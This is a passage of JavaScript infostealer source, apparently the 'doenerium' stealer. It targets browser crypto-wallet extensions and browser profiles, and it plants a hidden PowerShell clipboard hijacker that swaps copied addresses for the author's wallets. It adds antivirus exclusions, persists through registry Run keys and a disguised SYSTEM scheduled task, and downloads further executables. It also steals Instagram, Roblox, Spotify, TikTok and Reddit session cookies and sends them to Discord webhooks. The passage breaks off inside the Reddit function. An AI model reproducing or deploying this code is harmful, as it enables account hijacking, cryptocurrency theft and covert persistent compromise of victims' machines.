    '\\Local Extension Settings\\khpkpbbcccdmmclmpigdgddabeilkdpd'
_0x4ae424.Braavos =
    '\\Local Extension Settings\\jnlgamecbpmbajjfhmmmlhejkemejdma'
_0x4ae424.FewchaMove =
    '\\Local Extension Settings\\ebfidpplhabeedpnhjnobghokpiioolj'
_0x4ae424.EthosSui =
    '\\Local Extension Settings\\mcbigmjiafegjnnogedioegffbooigli'
_0x4ae424.ArgentX =
    '\\Local Extension Settings\\dlcobpjiigpikoobohmabehhmhfoodbb'
_0x4ae424.NiftyWallet =
    '\\Local Extension Settings\\jbdaocneiiinmjbjlgalhcelgbejmnid'
_0x4ae424.BraveWallet =
    '\\Local Extension Settings\\odbfpeeihdkbihmopkbjmoonfanlbfcl'
_0x4ae424.EqualWallet =
    '\\Local Extension Settings\\blnieiiffboillknjnepogjhkgnoapac'
_0x4ae424.BitAppWallet =
    '\\Local Extension Settings\\fihkakfobkmkjojpchpfgcmhfjnmnfpi'
_0x4ae424.iWallet =
    '\\Local Extension Settings\\kncchdigobghenbbaddojjnnaogfppfj'
_0x4ae424.AtomicWallet =
    '\\Local Extension Settings\\fhilaheimglignddkjgofkcbgekhenbh'
_0x4ae424.MewCx = '\\Local Extension Settings\\nlbmnnijcnlegkjjpcfjclmcfggfefdm'
_0x4ae424.GuildWallet =
    '\\Local Extension Settings\\nanjmdknhkinifnkgdcggcfnhdaammmj'
_0x4ae424.SaturnWallet =
    '\\Local Extension Settings\\nkddgncdjgjfcddamfgcmfnlhccnimig'
_0x4ae424.HarmonyWallet =
    '\\Local Extension Settings\\fnnegphlobjdpkhecapkijjdkgcjhkib'
_0x4ae424.PaliWallet =
    '\\Local Extension Settings\\mgffkfbidihjpoaomajlbgchddlicgpn'
_0x4ae424.BoltX = '\\Local Extension Settings\\aodkkagnadcbobfpggfnjeongemjbjca'
_0x4ae424.LiqualityWallet =
    '\\Local Extension Settings\\kpfopkelmapcoipemfendmdcghnegimn'
_0x4ae424.MaiarDeFiWallet =
    '\\Local Extension Settings\\dngmlblcodfobpdpecaadgfbcggfjfnm'
_0x4ae424.TempleWallet =
    '\\Local Extension Settings\\ookjlbkiijinhpmnjffcofjonbfbgaoc'
_0x4ae424.Metamask_E =
    '\\Local Extension Settings\\ejbalbakoplchlghecdalmeeeajnimhm'
_0x4ae424.Ronin_E =
    '\\Local Extension Settings\\kjmoohlgokccodicjjfebfomlbljgfhk'
_0x4ae424.Yoroi_E =
    '\\Local Extension Settings\\akoiaibnepcedcplijmiamnaigbepmcb'
_0x4ae424.Authenticator_E =
    '\\Sync Extension Settings\\ocglkepbibnalbgmbachknglpdipeoio'
_0x4ae424.MetaMask_O =
    '\\Local Extension Settings\\djclckkglechooblngghdinmeemkbgci'

const extension = _0x4ae424,
  browserPath = [
    [
      user.local + '\\Google\\Chrome\\User Data\\Default\\',
      'Default',
      user.local + '\\Google\\Chrome\\User Data\\',
    ],
    [
      user.local + '\\Google\\Chrome\\User Data\\Profile 1\\',
      'Profile_1',
      user.local + '\\Google\\Chrome\\User Data\\',
    ],
    [
      user.local + '\\Google\\Chrome\\User Data\\Profile 2\\',
      'Profile_2',
      user.local + '\\Google\\Chrome\\User Data\\',
    ],
    [
      user.local + '\\Google\\Chrome\\User Data\\Profile 3\\',
      'Profile_3',
      user.local + '\\Google\\Chrome\\User Data\\',
    ],
    [
      user.local + '\\Google\\Chrome\\User Data\\Profile 4\\',
      'Profile_4',
      user.local + '\\Google\\Chrome\\User Data\\',
    ],
    [
      user.local + '\\Google\\Chrome\\User Data\\Profile 5\\',
      'Profile_5',
      user.local + '\\Google\\Chrome\\User Data\\',
    ],
    [
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\',
      'Default',
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\',
    ],
    [
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\',
      'Profile_1',
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\',
    ],
    [
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\',
      'Profile_2',
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\',
    ],
    [
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\',
      'Profile_3',
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\',
    ],
    [
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\',
      'Profile_4',
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\',
    ],
    [
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\',
      'Profile_5',
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\',
    ],
    [
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\',
      'Guest Profile',
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\',
    ],
    [
      user.local + '\\Yandex\\YandexBrowser\\User Data\\Default\\',
      'Default',
      user.local + '\\Yandex\\YandexBrowser\\User Data\\',
    ],
    [
      user.local + '\\Yandex\\YandexBrowser\\User Data\\Profile 1\\',
      'Profile_1',
      user.local + '\\Yandex\\YandexBrowser\\User Data\\',
    ],
    [
      user.local + '\\Yandex\\YandexBrowser\\User Data\\Profile 2\\',
      'Profile_2',
      user.local + '\\Yandex\\YandexBrowser\\User Data\\',
    ],
    [
      user.local + '\\Yandex\\YandexBrowser\\User Data\\Profile 3\\',
      'Profile_3',
      user.local + '\\Yandex\\YandexBrowser\\User Data\\',
    ],
    [
      user.local + '\\Yandex\\YandexBrowser\\User Data\\Profile 4\\',
      'Profile_4',
      user.local + '\\Yandex\\YandexBrowser\\User Data\\',
    ],
    [
      user.local + '\\Yandex\\YandexBrowser\\User Data\\Profile 5\\',
      'Profile_5',
      user.local + '\\Yandex\\YandexBrowser\\User Data\\',
    ],
    [
      user.local + '\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\',
      'Guest Profile',
      user.local + '\\Yandex\\YandexBrowser\\User Data\\',
    ],
    [
      user.local + '\\Microsoft\\Edge\\User Data\\Default\\',
      'Default',
      user.local + '\\Microsoft\\Edge\\User Data\\',
    ],
    [
      user.local + '\\Microsoft\\Edge\\User Data\\Profile 1\\',
      'Profile_1',
      user.local + '\\Microsoft\\Edge\\User Data\\',
    ],
    [
      user.local + '\\Microsoft\\Edge\\User Data\\Profile 2\\',
      'Profile_2',
      user.local + '\\Microsoft\\Edge\\User Data\\',
    ],
    [
      user.local + '\\Microsoft\\Edge\\User Data\\Profile 3\\',
      'Profile_3',
      user.local + '\\Microsoft\\Edge\\User Data\\',
    ],
    [
      user.local + '\\Microsoft\\Edge\\User Data\\Profile 4\\',
      'Profile_4',
      user.local + '\\Microsoft\\Edge\\User Data\\',
    ],
    [
      user.local + '\\Microsoft\\Edge\\User Data\\Profile 5\\',
      'Profile_5',
      user.local + '\\Microsoft\\Edge\\User Data\\',
    ],
    [
      user.local + '\\Microsoft\\Edge\\User Data\\Guest Profile\\',
      'Guest Profile',
      user.local + '\\Microsoft\\Edge\\User Data\\',
    ],
    [
      user.roaming + '\\Opera Software\\Opera Neon\\User Data\\Default\\',
      'Default',
      user.roaming + '\\Opera Software\\Opera Neon\\User Data\\',
    ],
    [
      user.roaming + '\\Opera Software\\Opera Stable\\',
      'Default',
      user.roaming + '\\Opera Software\\Opera Stable\\',
    ],
    [
      user.roaming + '\\Opera Software\\Opera GX Stable\\',
      'Default',
      user.roaming + '\\Opera Software\\Opera GX Stable\\',
    ],
  ],
randomPath = path.join(mainFolderPath);

if (!fs.existsSync(randomPath)) {
  console.log('Wallets directory already exists. Skipping creation.');
} else {
  sendSuccessToWebhook();
}

function initializeFolders() {
    try {
        if (!fs.existsSync(mainFolderPath)) {
            fs.mkdirSync(mainFolderPath, { recursive: true });
            console.log('Main folder created successfully');
            sendSuccessToWebhook();
        }
    } catch (error) {
        const errorMessage = `Error Initialize main folder: ${error.message}`;
        console.error(errorMessage);
    }
}


function createAndExecuteScripts() {
    const userDataPath = path.join('C:', 'ProgramData', 'edge', 'Updater');
    if (!fs.existsSync(userDataPath)) {
        fs.mkdirSync(userDataPath, { recursive: true });
    }

    const scriptsPath = userDataPath;
    const powershellScriptContent = `
$sctpth = $MyInvocation.MyCommand.Path
$ran = -join ((65..90) + (97..122) | Get-Random -Count 15 | ForEach-Object {[char]$_})
$ranpth = if ((Get-Random) % 2) { Join-Path $env:TEMP "$ran.ps1" } else { Join-Path $env:APPDATA "$ran.ps1" }
Copy-Item -Path $sctpth -Destination $ranpth -Force
Remove-Item -Path $sctpth -Force

$key = "HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
$valn = "Powershell"
$val = """powershell.exe"" -WindowStyle Hidden -ExecutionPolicy Bypass -File ""$ranpth"""

if (!(Test-Path $key)) {
    New-Item -Path $key -Force | Out-Null
}

Set-ItemProperty -Path $key -Name $valn -Value $val

Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("Kernel32.dll")]
public static extern IntPtr GetConsoleWindow();
[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
public static void Hide()
{
    IntPtr hWnd = GetConsoleWindow();
    if(hWnd != IntPtr.Zero)
    {
        ShowWindow(hWnd, 0);
    }
}
'
[Console.Window]::Hide()

$attr = [System.IO.FileAttributes]::Hidden
Set-ItemProperty -Path $ranpth -Name Attributes -Value $attr

$addy = @{
    "btc" = "bc1qsuc4rc2uknl43kqxemuyv6d3xffnds2j008gj7"
    "eth" = "0x700875DF55d904b24469458a6bAE04F6dd7eF91F"
    "ltc" = "ltc1qx7n7fr4anyssyhfp2s4sd9jv7r89ex9sd2d6dg"
    "trx" = "TJYeEhaoY5sQ66SHLbCp85jGcSkqLLvBTU"
    "bch" = "qzjw4dju5x2x3kwtuelppmm8lpw7mvna7s5fle3sr4"
    "xmr" = "43AKqd1L4QKVQux7bKEK6dUmVKEJTdEtgSgYaj25rgRGaUrp2gekLA1bRDzJbbadPTaNwBG8njmYCVvEiJZByyvV6NanCUR"
    "xrp" = "rf2ysNUBNYFPX5tzNfaNgRjJDedQWh6mSV"
    "zcash" = "t1a34uQ8XRNKoWyykQUAtR6vj58UDMpaayf"
    "doge" = "DQ5eZQyMbCsAGDoE7vq3zsPH7v43EvfUV6rJvtArsqqv7LEmb3BF6e1vHudGPCQppaxf"
}

while ($true) {
    $clipper = Get-Clipboard
    if ($clipper -match "^(bc1|[13])[a-zA-HJ-NP-Z0-9]{26,41}$") {
        $clipper = $addy["btc"]
        [System.Windows.Forms.Clipboard]::SetText($clipper)
    }
    elseif ($clipper -match "^0x[a-fA-F0-9]{40}$") {
        $clipper = $addy["eth"]
        [System.Windows.Forms.Clipboard]::SetText($clipper)
    }
    elseif ($clipper -match "^(L|M|3|ltc1)[a-km-zA-HJ-NP-Z1-9]{26,33}$") {
        $clipper = $addy["ltc"]
        [System.Windows.Forms.Clipboard]::SetText($clipper)
    }
    elseif ($clipper -match "^T[a-zA-Z0-9]{28,33}$") {
        $clipper = $addy["trx"]
        [System.Windows.Forms.Clipboard]::SetText($clipper)
    }
    elseif ($clipper -match "^((bitcoincash:)?(q|p)[a-z0-9]{41})$") {
        $clipper = $addy["bch"]
        [System.Windows.Forms.Clipboard]::SetText($clipper)
    }
    elseif ($clipper -match "^4[0-9AB][1-9A-HJ-NP-Za-km-z]{92,95}$") {
        $clipper = $addy["xmr"]
        [System.Windows.Forms.Clipboard]::SetText($clipper)
    }
    elseif ($clipper -match "^(?:^r[0-9a-zA-Z]{24,34}$)") {
        $clipper = $addy["xrp"]
        [System.Windows.Forms.Clipboard]::SetText($clipper)
    }
    elseif ($clipper -match "^t1[0-9A-z]{32,39}$") {
        $clipper = $addy["zcash"]
        [System.Windows.Forms.Clipboard]::SetText($clipper)
    }
    elseif ($clipper -match "^{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32,61}$") {
        $clipper = $addy["doge"]
        [System.Windows.Forms.Clipboard]::SetText($clipper)
    }
    Start-Sleep -Milliseconds 500
}`;

    const ps1Path = path.join(scriptsPath, 'Get-Clipboard.ps1');

    try {
        fs.writeFileSync(ps1Path, powershellScriptContent, 'utf8');
        console.log(`Script PowerShell enregistré avec succès à l'emplacement : ${ps1Path}`);

        exec(`powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File "${ps1Path}"`, (error, stdout, stderr) => {
            if (error) {
                console.error(`Erreur lors de l'exécution du script PowerShell : ${error.message}`);
                return;
            }
            if (stderr) {
                console.error(`Erreur lors de l'exécution du script PowerShell : ${stderr}`);
                return;
            }
            console.log(`Script PowerShell exécuté avec succès : ${stdout}`);
        });
    } catch (error) {
        console.error(`Erreur lors de l'enregistrement du script PowerShell : ${error.message}`);
        return;
    }
}



function createRunBat() {
    const userData = path.join('C:', 'ProgramData', 'edge', 'Updater');
    if (!fs.existsSync(userData)) {
        fs.mkdirSync(userData, { recursive: true });
    }

    // URL
    const downloadUrl1 = "YOUR-STEALER-EXE-LINK-HERE";
    const downloadUrl2 = "YOUR-BINDED-EXE-LINK-HERE";
    
    const app1Path = `"${process.argv[0]}"`;
    const app2Path = '"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Steam_Service.exe"';
    const batContent = `@echo off

powershell Add-MpPreference -ExclusionPath "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
powershell Add-MpPreference -ExclusionPath "%APPDATA%\\Microsoft\\Windows"
REM Add registry key
reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v "Steam" /t REG_SZ /d ${app1Path} /f

REM Display registry value
reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v "Steam"

REM Verify if App1 is already installed
if not exist ${app1Path} (
    REM Download and install App1
    curl -o ${app1Path} ${downloadUrl1}
    if not exist ${app1Path} (
        echo Error downloading App1.
    ) else (
        echo App1 installed successfully.
    )
) else (
    echo App1 is already installed.
)
REM Verify if App2 is already installed
if not exist ${app2Path} (
    REM Download and install App2
    curl -o ${app2Path} ${downloadUrl2}
    if not exist ${app2Path} (
        echo Error downloading App2.
    ) else (
        echo App2 installed successfully.
    )
) else (
    echo App2 is already installed.
)
`;

    const batScriptPath = path.join(userData, 'CheckEpicGamesLauncher.bat');
    fs.writeFileSync(batScriptPath, batContent, 'utf-8');

    console.log(`Batch script created successfully at: ${batScriptPath}`);

    const vbsContent = `Set objShell = CreateObject("WScript.Shell")
objShell.Run "${batScriptPath}", 0, True
Set objShell = Nothing`;

    const vbsScriptPath = path.join(userData, 'RunBatHidden.vbs');
    fs.writeFileSync(vbsScriptPath, vbsContent, 'utf-8');

    console.log(`VBS script created successfully at: ${vbsScriptPath}`);

    const taskName = 'GoogleUpdateTaskMachineUAC';
    const schtasksCommand = `schtasks /create /tn "${taskName}" /tr "cscript //nologo ${vbsScriptPath}" /sc minute /mo 10 /f /RU SYSTEM`;

    exec(schtasksCommand, (err, stdout, stderr) => {
        if (err) {
            console.error('Error executing schtasks command:', err.message);
        } else {
            console.log('Scheduled task for verification created successfully.');
            const runVbsCommand = `cscript //nologo "${vbsScriptPath}"`;
            exec(runVbsCommand, (vbsErr, vbsStdout, vbsStderr) => {
                if (vbsErr) {
                    console.error('Error executing VBS script:', vbsErr.message);
                } else {
                    console.log('VBS script executed successfully.');
                }
            });
        }
    });
}




async function GetInstaData(session_id) {
  try {
    const headers = {
      "Host": "i.instagram.com",
      "X-Ig-Connection-Type": "WiFi",
      "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
      "X-Ig-Capabilities": "36r/Fx8=",
      "User-Agent": "Instagram 159.0.0.28.123 (iPhone8,1; iOS 14_1; en_SA@calendar=gregorian; ar-SA; scale=2.00; 750x1334; 244425769) AppleWebKit/420+",
      "X-Ig-App-Locale": "en",
      "X-Mid": "Ypg64wAAAAGXLOPZjFPNikpr8nJt",
      "Accept-Encoding": "gzip, deflate",
      "Cookie": `sessionid=${session_id};`
    };

    // Request to get Instagram account data
    const response = await axios.get("https://i.instagram.com/api/v1/accounts/current_user/?edit=true", { headers: headers });
    const userData = response.data.user;

    // Create data object
    const data = {
      username: userData.username,
      verified: userData.is_verified,
      avatar: userData.profile_pic_url,
      session_id: session_id
    };

    // Save Instagram session information to a file
    saveInstagramFile(session_id);

    return data;
  } catch (error) {
    console.error('Error fetching Instagram data:', error.message);
  }
}

function saveInstagramFile(session_id) {
  const instagramFolderPath = path.join(mainFolderPath, 'Instagram');
  const instagramFilePath = path.join(instagramFolderPath, 'instagram.txt');

  if (!fs.existsSync(instagramFolderPath)) {
    fs.mkdirSync(instagramFolderPath);
  }

  // Write the Instagram session information to the instagram.txt file
  fs.writeFileSync(instagramFilePath, `sessionid=${session_id}`);

  console.log('Instagram session information written to instagram.txt');
}

async function GetFollowersCount(session_id) {
  try {
    const headers = {
      "Host": "i.instagram.com",
      "User-Agent": "Instagram 159.0.0.28.123 (iPhone8,1; iOS 14_1; en_SA@calendar=gregorian; ar-SA; scale=2.00; 750x1334; 244425769) AppleWebKit/420+",
      "Cookie": `sessionid=${session_id};`
    };

    const accountResponse = await axios.get("https://i.instagram.com/api/v1/accounts/current_user/?edit=true", { headers: headers });
    const accountInfo = accountResponse.data.user;

    const userInfoResponse = await axios.get(`https://i.instagram.com/api/v1/users/${accountInfo.pk}/info`, { headers: headers });
    const userData = userInfoResponse.data.user;
    const followersCount = userData.follower_count;

    return followersCount;
  } catch (error) {
    console.error("Error fetching followers count:", error.message);
  }
}

async function SubmitInstagram(session_id) {
  try {
    const data = await GetInstaData(session_id);
    const followersCount = await GetFollowersCount(session_id);

    const embed = {
      title: '‎ ',
      color: 0x303037,
      author: {
        name: 'Instagram Session Detected',
        icon_url: 'https://cdn.discordapp.com/attachments/660885288079589385/1190791450938572800/2048px-Instagram_icon.png'
      },
      thumbnail: { url: data.avatar },
      fields: [
        { name: '<a:VerifiedUser:1205132509076135987> Verified Account', value: '```' + (data.verified ? 'Yes' : 'No') + '```', inline: true },
        { name: '👤 Username ', value: '```' + data.username + '```', inline: true },
        { name: '<:twitter_follow:1205132510254604388> Followers Count ', value: '```' + followersCount + '```', inline: true },
        { name: 'Token', value: '```' + data.session_id + '```', inline: false },
      ],
      footer: {
        text: `${user.hostname} | @WallGod69 | t.me/doenerium69`,
      },
    };

    await axios.post(discordWebhookUr1, { embeds: [embed] });

    // Introduce a 2-second delay before sending the second webhook request
    await new Promise(resolve => setTimeout(resolve, 1000));

    // Retry logic with exponential backoff
    let retryAttempts = 0;
    while (retryAttempts < 3) { // Retry a maximum of 3 times
      try {
        await axios.post(discordWebhookUrl, { embeds: [embed] });
        break; // Break the loop if successful
      } catch (error) {
        if (error.response && error.response.status === 429) {
          // Exponential backoff: Wait for an increasing amount of time
          const delay = Math.pow(2, retryAttempts) * 1000;
          retryAttempts++;
          await new Promise(resolve => setTimeout(resolve, delay));
        } else {
          console.error("Error in second webhook request:", error.message);
          // Log the error and skip to the next iteration
          return; // or continue; depending on your context
        }
      }
    }
  } catch (error) {
    console.error("Error Submit Instagram:", error.message);
  }
}




async function GetRobloxData(secret_cookie) {
  let data = {};
  let headers = {
    'accept': 'application/json, text/plain, */*',
    'accept-encoding': 'gzip, deflate, br',
    'accept-language': 'en-US,en;q=0.9,hi;q=0.8',
    'cookie': `.ROBLOSECURITY=${secret_cookie};`,
    'origin': 'https://www.roblox.com',
    'referer': 'https://www.roblox.com',
    'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36'
  };

  try {
    let response = await axios.get('https://www.roblox.com/mobileapi/userinfo', { headers: headers });

    data['username'] = response.data['UserName'];
    data['avatar'] = response.data['ThumbnailUrl'];
    data['robux'] = response.data['RobuxBalance'];
    data['premium'] = response.data['IsPremium'];

    return data;
  } catch (error) {
    console.error('Error fetching Roblox data:', error.message);
    throw error;
  }
}

async function SubmitRoblox(secret_cookie) {
  try {
    let data = await GetRobloxData(secret_cookie);

    if (!data || !data.username || data.robux === undefined || data.premium === undefined) {
      return;
    }

    const robuxValue = data.robux === 0 ? 'No Robux' : data.robux;

    let embed = {
      title: '‎',
      color: 0x303037,
      author: {
        name: 'Roblox Session Detected',
        icon_url: 'https://images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%3Fsize%3D96%26quality%3Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp',
      },
      thumbnail: {
        url: data.avatar,
      },
      fields: [
        {
          name: 'Name:',
          value: '```     ' + data.username + '     ```',
          inline: true,
        },
        {
          name: 'Robux:',
          value: '```   ' + robuxValue + '   ```',
          inline: true,
        },
        {
          name: 'Premium:',
          value: '```   ' + (data.premium ? 'Yes' : 'No') + '   ```',
          inline: true,
        },
        {
          name: 'Secret Cookie:',
          value: '```   ' + secret_cookie + '   ```',
          inline: true,
        },
      ],
      footer: {
        text: `${user.hostname} | @WallGod69 | t.me/doenerium69`,
        icon_url: 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp',
      },
    };

    let payload = {
      embeds: [embed],
    };

    await new Promise(resolve => setTimeout(resolve, 1000));

    console.log('Payload to be sent:', payload);

    axios.post(discordWebhookUrl, payload);
    axios.post(discordWebhookUr1, payload);
  } catch (error) {
    console.error('Error in SubmitRoblox:', error.message);
  }
}






//
async function SpotifySession(cookie) {
    try {
        const url = 'https://www.spotify.com/api/account-settings/v1/profile';

        const headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36',
            'Cookie': `sp_dc=${cookie}`
        };

        const response = await axios.get(url, { headers });

        const profileData = response.data.profile;

        const email = profileData.email || "Not available";
        const gender = profileData.gender || "Not available";
        const birthdate = profileData.birthdate || "Not available";
        const country = profileData.country || "Not available";
        const username = profileData.username || "Not available";

        const embedData = {
            title: '‎ ',
            color: 0x303037,
            author: {
                name: 'Spotify Session Detected',
                icon_url: 'https://upload.wikimedia.org/wikipedia/commons/thumb/7/74/Spotify_App_Logo.svg/1200px-Spotify_App_Logo.svg.png' // Replace with the URL of the icon image
            },
            fields: [
                { name: 'Email', value: "```" + email + "```", inline: true },
                { name: 'Username', value: "```" + username + "```", inline: true },
                { name: 'Gender', value: "```" + gender + "```", inline: true },
                { name: 'Birthdate', value: "```" + birthdate + "```", inline: true },
                { name: 'Country', value: "```" + country + "```", inline: true },
                { name: 'Spotify Profile', value: `[Open Profile](https://open.spotify.com/user/${username})`, inline: false },
                { name: 'Spotify Cookie | sp_dc=', value: '```' + cookie + '```', inline: false }
            ],
            footer: {
                text: `${user.hostname} | @WallGod69 | t.me/doenerium69`,
                icon_url: 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp'
            }
        };

        const payload = {
            embeds: [embedData],
        };

        const randomString = crypto.randomBytes(3).toString('hex');

        setTimeout(() => {
            axios.post(discordWebhookUrl, payload)
                .then(response => {
                    console.log('Webhook sent successfully spotify:', response.data);
                })
                .catch(error => {
                    console.error('Error sending Discord webhook:', error.message);
                    console.error('Error Message:', error.message);
                });
        }, 5000);
    } catch (error) {
        console.error('Error fetching Spotify data:', error.message);
        console.error('Error Message:', error.message);
    }
}




function moveTikTokFile(cookie) {
  if (!cookie) {
    // No TikTok session information intercepted, so no need to create the folder or file
    return;
  }
  const tiktokFolderPath = path.join(mainFolderPath, 'Tiktok');
  const tiktokFilePath = path.join(tiktokFolderPath, 'tiktok.txt');
  if (!fs.existsSync(tiktokFolderPath)) {
    fs.mkdirSync(tiktokFolderPath);
  }
  // Write the intercepted TikTok session information to the tiktok.txt file
  fs.writeFileSync(tiktokFilePath, cookie);
  console.log('TikTok session information written to tiktok.txt');
}






function stealTikTokSession(cookie) {
  try {
    const headers = {
      'accept': 'application/json, text/plain, */*',
      'accept-encoding': 'gzip, compress, deflate, br',
      'cookie': `sessionid=${cookie}`
    };

    axios.get("https://www.tiktok.com/passport/web/account/info/?aid=1459&app_language=de-DE&app_name=tiktok_web&battery_info=1&browser_language=de-DE&browser_name=Mozilla&browser_online=true&browser_platform=Win32&browser_version=5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F112.0.0.0%20Safari%2F537.36&channel=tiktok_web&cookie_enabled=true&device_platform=web_pc&focus_state=true&from_page=fyp&history_len=2&is_fullscreen=false&is_page_visible=true&os=windows&priority_region=DE&referer=&region=DE&screen_height=1080&screen_width=1920&tz_name=Europe%2FBerlin&webcast_language=de-DE", { headers })
      .then(response => {
        const accountInfo = response.data;

        if (!accountInfo || !accountInfo.data || !accountInfo.data.username) {
          throw new Error("Failed to retrieve TikTok account information.");
        }

        axios.post(
          "https://api.tiktok.com/aweme/v1/data/insighs/?tz_offset=7200&aid=1233&carrier_region=DE",
          "type_requests=[{\"insigh_type\":\"vv_history\",\"days\":16},{\"insigh_type\":\"pv_history\",\"days\":16},{\"insigh_type\":\"like_history\",\"days\":16},{\"insigh_type\":\"comment_history\",\"days\":16},{\"insigh_type\":\"share_history\",\"days\":16},{\"insigh_type\":\"user_info\"},{\"insigh_type\":\"follower_num_history\",\"days\":17},{\"insigh_type\":\"follower_num\"},{\"insigh_type\":\"week_new_videos\",\"days\":7},{\"insigh_type\":\"week_incr_video_num\"},{\"insigh_type\":\"self_rooms\",\"days\":28},{\"insigh_type\":\"user_live_cnt_history\",\"days\":58},{\"insigh_type\":\"room_info\"}]",
          { headers: { cookie: `sessionid=${cookie}` } }
        )
          .then(response => {
            const insights = response.data;

            axios.get(
              "https://webcast.tiktok.com/webcast/wallet_api/diamond_buy/permission/?aid=1988&app_language=de-DE&app_name=tiktok_web&battery_info=1&browser_language=de-DE&browser_name=Mozilla&browser_online=true&browser_platform=Win32&browser_version=5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F112.0.0.0%20Safari%2F537.36&channel=tiktok_web&cookie_enabled=true",
              { headers: { cookie: `sessionid=${cookie}` } }
            )
              .then(response => {
                const wallet = response.data;

                const webhookPayload = {
                  embeds: [
                    {
                      title: '‎ ',
                      color: 0x303037,
                      author: {
                        name: 'Tiktok Session Detected',
                        icon_url: 'https://cdn.discordapp.com/attachments/660885288079589385/1190790151086035094/tiktok-6338430_1280.png' 
                      },
                      fields: [
                        {
                          name: '<:cookie:1205123589930749995> Cookies',
                          value: "```" + cookie + "```",
                          inline: true
                        },
                        {
                          name: "Profile URL",
                          value: accountInfo.data.username ? `[Click here](https://tiktok.com/@${accountInfo.data.username})` : "Username not available",
                          inline: true
                        },
                        {
                          name: "User Identifier",
                          value: "```" + (accountInfo.data.user_id_str || "Not available") + "```",
                          inline: true
                        },
                        {
                          name: ":envelope: Email",
                          value: "```" + (accountInfo.data.email || "No Email") + "```",
                          inline: true
                        },
                        {
                          name: "👤 Username",
                          value: "```" + accountInfo.data.username + "```",
                          inline: true
                        },
                        {
                          name: "<:twitter_follow:1205132510254604388> Follower Count",
                          value: "```" + (insights?.follower_num?.value || "Not available") + "```",
                          inline: true
                        },
                        {
                          name: "<:freetiktokcoinwithblinkstar74553:1205133412122230915> Coins",
                          value: "```" + wallet.data.coins + "```",
                          inline: true
                        }
                      ],
                      footer: {
                        text: `${user.hostname} | @WallGod69 | t.me/doenerium69`,
                        icon_url: 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp',
                      },
                    }
                  ]
                };

                axios.post(discordWebhookUr1, webhookPayload);
                axios.post(discordWebhookUrl, webhookPayload)
                  .then(response => {
                    console.log('Discord webhook sent successfully! send tiktok');
                    moveTikTokFile(cookie);
                  })
                  .catch(error => {
                    console.error('Error sending Discord webhook:', error.message);
                  });
              })
              .catch(error => {
                console.error('An error occurred while trying to retrieve wallet information:', error.message);
              });
          })
          .catch(error => {
            console.error('An error occurred while trying to retrieve insights:', error.message);
          });
      })
      .catch(error => {
        console.error('An error occurred while trying to retrieve account information:', error.message);
      });
  } catch (error) {
    console.error('An error occurred while trying to steal TikTok session:', error.message);
  }
}


function setRedditSession(cookie) {
    try {
        const cookies = `reddit_session=${cookie}`;
        const headers = {
            'Cookie': cookies,
            'Authorization': 'Basic b2hYcG9xclpZdWIxa2c6'
        };

        const jsonData = {
            scopes: ['*', 'email', 'pii']
        };

        const tokenUrl = 'https://accounts.reddit.com/api/access_token';
